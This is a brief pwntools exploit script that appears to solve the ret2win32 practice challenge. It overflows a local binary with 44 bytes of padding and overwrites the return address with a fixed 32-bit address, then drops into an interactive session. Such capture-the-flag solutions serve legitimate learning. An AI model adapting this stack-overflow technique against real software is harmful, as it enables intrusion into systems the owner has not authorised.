from pwn import *

proc = process("./ret2win32")

buf = 'A'*44

gadget = p32(0x0804862c)

payload = buf.encode('utf-8')
payload += gadget

proc.sendline(payload)
proc.interactive()


